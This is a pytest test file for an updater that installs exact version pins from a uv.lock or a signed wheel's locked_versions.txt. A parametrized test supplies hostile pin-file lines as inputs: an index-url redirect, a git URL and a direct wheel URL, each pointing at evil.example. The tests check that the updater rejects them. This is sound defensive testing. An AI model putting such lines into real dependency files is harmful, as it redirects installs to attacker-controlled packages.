"""``kazma update`` installs the versions CI tested (2026-11-14, REMAINING 2.1).

Before, an update kept any installed version that satisfied pyproject's
floors and took the newest for anything new, so an install ran versions no
test had run. Now:

* a checkout installs with its own ``uv.lock`` as constraints (``uv export
  --locked``; a lock that no longer matches pyproject.toml is not used, and
  the update says so);
* a release wheel carries ``kazma_cli/locked_versions.txt`` (written by the
  release workflow before it builds, so the wheel's Sigstore signature covers
  it); the updater reads it from the verified wheel and installs with it. An
  older wheel carries none and installs as before, saying so; a file that is
  not exact pins (an option line could name another index) stops the update.
"""

from __future__ import annotations

import re
import shutil
import subprocess
import sys
import zipfile
from pathlib import Path
from typing import Any

import pytest

REPO = Path(__file__).resolve().parents[1]

PINS = "httpx==0.28.1\n    # via kazma\ncolorama==0.4.6 ; sys_platform == 'win32'\n"


def _wheel(tmp: Path, locked: str | None) -> Path:
    path = tmp / "kazma-9.9.9-py3-none-any.whl"
    with zipfile.ZipFile(path, "w") as zf:
        zf.writestr("kazma_cli/__init__.py", "")
        if locked is not None:
            zf.writestr("kazma_cli/locked_versions.txt", locked)
    return path


# ── a checkout: its uv.lock ─────────────────────────────────────────────


@pytest.mark.skipif(shutil.which("uv") is None, reason="uv is not installed")
def test_a_checkout_exports_its_lock_as_exact_pins(tmp_path) -> None:
    from kazma_cli import update

    path, why = update._locked_versions(str(REPO), tmp_path)
    assert why == "" and path is not None
    text = path.read_text(encoding="utf-8")
    assert update._locked_text_problem(text) == ""
    # The pin is uv.lock's own version of a package Kazma depends on.
    lock = (REPO / "uv.lock").read_text(encoding="utf-8")
    locked_httpx = re.search(r'\[\[package\]\]\nname = "httpx"\nversion = "([^"]+)"', lock).group(1)
    assert f"httpx=={locked_httpx}" in text
    assert "kazma==" not in text  # the project itself is the editable install


@pytest.mark.skipif(shutil.which("uv") is None, reason="uv is not installed")
def test_a_lock_that_no_longer_matches_is_not_used(tmp_path) -> None:
    """Negative control: a project whose pyproject changed after its lock."""
    from kazma_cli import update

    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname = "demo"\nversion = "1.0"\nrequires-python = ">=3.11"\ndependencies = ["httpx>=0.27"]\n',
        encoding="utf-8")
    (tmp_path / "uv.lock").write_text('version = 1\nrequires-python = ">=3.11"\n', encoding="utf-8")
    path, why = update._locked_versions(str(tmp_path), tmp_path)
    assert path is None and why


def test_the_editable_install_runs_with_the_pins(monkeypatch, tmp_path) -> None:
    from kazma_cli import update

    pins = tmp_path / "locked-versions.txt"
    pins.write_text(PINS, encoding="utf-8")
    ran: list[list[str]] = []
    monkeypatch.setattr(update, "_is_server_running", lambda port=9090: False)
    monkeypatch.setattr(update, "detect_active_extras", lambda cwd=None: [])
    monkeypatch.setattr(update, "_locked_versions", lambda cwd, folder: (pins, ""))
    monkeypatch.setattr(update, "_environment_problem", lambda: "")
    monkeypatch.setattr(update, "_cleanup_broken_distributions", lambda: None)
    monkeypatch.setattr(update, "_log_update_step", lambda *a, **k: None)

    def run(cmd: list[str], cwd: str | None = None, timeout: float = 0) -> Any:
        ran.append(list(cmd))
        return subprocess.CompletedProcess(cmd, 0, "", "")

    monkeypatch.setattr(update, "_run_cmd", run)
    assert update._reinstall_local(str(tmp_path)) is True
    (install,) = ran
    assert install[:3] == ["uv", "pip", "install"] and install[-2:] == ["-c", str(pins)]


def test_without_a_usable_lock_the_update_says_so_and_installs_unpinned(monkeypatch, tmp_path) -> None:
    from kazma_cli import update

    ran: list[list[str]] = []
    said: list[str] = []
    monkeypatch.setattr(update, "_is_server_running", lambda port=9090: False)
    monkeypatch.setattr(update, "detect_active_extras", lambda cwd=None: [])
    monkeypatch.setattr(update, "_locked_versions", lambda cwd, folder: (None, "uv.lock needs to be updated"))
    monkeypatch.setattr(update, "_environment_problem", lambda: "")
    monkeypatch.setattr(update, "_cleanup_broken_distributions", lambda: None)
    monkeypatch.setattr(update, "_log_update_step", lambda *a, **k: None)
    monkeypatch.setattr(update.console, "print", lambda *a, **k: said.append(" ".join(map(str, a))))
    monkeypatch.setattr(update, "_run_cmd",
                        lambda cmd, cwd=None, timeout=0: ran.append(list(cmd)) or subprocess.CompletedProcess(cmd, 0, "", ""))
    assert update._reinstall_local(str(tmp_path)) is True
    assert "-c" not in ran[0]
    assert any("uv.lock could not be used (uv.lock needs to be updated)" in s for s in said)


# ── a release wheel: the versions it carries ────────────────────────────


def test_a_wheel_gives_its_locked_versions(tmp_path) -> None:
    from kazma_cli import update

    path, why = update._locked_versions_in_wheel(_wheel(tmp_path, PINS), tmp_path)
    assert why == "" and path is not None and path.read_text(encoding="utf-8") == PINS


def test_an_older_wheel_carries_none_and_that_is_no_problem(tmp_path) -> None:
    from kazma_cli import update

    assert update._locked_versions_in_wheel(_wheel(tmp_path, None), tmp_path) == (None, "")


@pytest.mark.parametrize("hostile", [
    "--index-url https://evil.example/simple\nhttpx==0.28.1\n",
    "-e git+https://evil.example/x\n",
    "httpx>=0.20\n",
    "httpx @ https://evil.example/httpx.whl\n",
    "# only a comment\n",
])
def test_a_locked_file_that_is_not_exact_pins_stops_the_update(tmp_path, hostile) -> None:
    from kazma_cli import update

    path, why = update._locked_versions_in_wheel(_wheel(tmp_path, hostile), tmp_path)
    assert path is None and "cannot be used" in why


def _release(tmp_path: Path, locked: str | None) -> tuple[Any, list[list[str]], list[str]]:
    """The updater's wheel path on a stand-in download, signature taken as
    good (its own tests are tests/test_update_checks_release_signature.py)."""
    import hashlib

    from kazma_cli import update

    wheel = _wheel(tmp_path, locked)
    data = wheel.read_bytes()
    release = update.ReleaseInfo(
        version="9.9.9", wheel_name=wheel.name,
        wheel_url=update._RELEASE_DOWNLOAD_PREFIX + "v9.9.9/" + wheel.name,
        wheel_sha256=hashlib.sha256(data).hexdigest(),
        bundle_url=update._RELEASE_DOWNLOAD_PREFIX + "v9.9.9/" + wheel.name + ".sigstore.json",
    )

    class Resp:
        def __init__(self, content: bytes) -> None:
            self.content = content

        def raise_for_status(self) -> None:
            return None

        def iter_bytes(self):
            yield self.content

        def __enter__(self):
            return self

        def __exit__(self, *exc: object) -> bool:
            return False

    class Client:
        def __init__(self, *a: Any, **k: Any) -> None:
            pass

        def __enter__(self):
            return self

        def __exit__(self, *exc: object) -> bool:
            return False

        def stream(self, method: str, url: str, **_k: Any) -> Resp:
            return Resp(data if url == release.wheel_url else b"{}")

    return release, Client, data


def test_the_wheel_path_installs_with_the_versions_the_release_was_tested_with(monkeypatch, tmp_path) -> None:
    import httpx

    from kazma_cli import update

    release, client, _data = _release(tmp_path, PINS)
    installed: list[list[str]] = []
    monkeypatch.setattr(httpx, "Client", client)
    monkeypatch.setattr(update, "_is_server_running", lambda port=9090: False)
    monkeypatch.setattr(update, "check_bundle", lambda digest, bundle: "release.yml@refs/heads/main")
    monkeypatch.setattr(update, "_run_pip", lambda args, timeout=0: installed.append(list(args))
                        or subprocess.CompletedProcess(args, 0, "", ""))
    assert update.do_pip_update(release) is True
    (args,) = installed
    assert args[:2] == ["install", "--upgrade"] and args[-2] == "-c"
    # With --reinstall: Kazma alone is put back first, then the pinned install.
    installed.clear()
    assert update.do_pip_update(release, reinstall=True) is True
    assert "-c" not in installed[0] and installed[1][-2] == "-c"


def test_the_wheel_path_refuses_a_release_whose_locked_versions_are_hostile(monkeypatch, tmp_path) -> None:
    import httpx

    from kazma_cli import update

    release, client, _data = _release(tmp_path, "--index-url https://evil.example/simple\n")
    installed: list[list[str]] = []
    monkeypatch.setattr(httpx, "Client", client)
    monkeypatch.setattr(update, "_is_server_running", lambda port=9090: False)
    monkeypatch.setattr(update, "check_bundle", lambda digest, bundle: "release.yml@refs/heads/main")
    monkeypatch.setattr(update, "_run_pip", lambda args, timeout=0: installed.append(list(args))
                        or subprocess.CompletedProcess(args, 0, "", ""))
    assert update.do_pip_update(release) is False
    assert installed == []


# ── the release workflow and the build carry the file ───────────────────


def test_the_release_writes_the_locked_versions_before_it_builds_and_checks_the_wheel() -> None:
    from kazma_cli.update import LOCKED_VERSIONS_MEMBER

    workflow = (REPO / ".github" / "workflows" / "release.yml").read_text(encoding="utf-8")
    write = workflow.index("-o kazma-cli/kazma_cli/locked_versions.txt")
    build = workflow.index("uv build --out-dir dist")
    assert write < build
    assert "--locked" in workflow[workflow.rfind("uv export", 0, write):write]
    assert f"'{LOCKED_VERSIONS_MEMBER}' in n" in workflow[build:]
    pyproject = (REPO / "pyproject.toml").read_text(encoding="utf-8")
    assert 'artifacts = ["kazma-cli/kazma_cli/locked_versions.txt"]' in pyproject
    # Git ignores it: a release writes it, and it is never committed.
    ignored = subprocess.run(["git", "check-ignore", "-q", "kazma-cli/kazma_cli/locked_versions.txt"],
                             cwd=REPO, capture_output=True)
    assert ignored.returncode == 0
    assert LOCKED_VERSIONS_MEMBER == "kazma_cli/locked_versions.txt"


def test_the_pin_rule_accepts_what_uv_export_writes() -> None:
    from kazma_cli import update

    text = ("accelerate==1.15.0\n    # via docling-slim\n"
            "numpy==2.4.6 ; python_full_version < '3.12'\n"
            "pywin32==312 ; sys_platform == 'win32'\n"
            "pycparser==3.0 ; implementation_name != 'PyPy'\n"
            "python-dateutil==2.9.0.post0\n"
            "types-protobuf==7.35.1.20260826\n")
    assert update._locked_text_problem(text) == ""
    assert sys.version_info >= (3, 11)
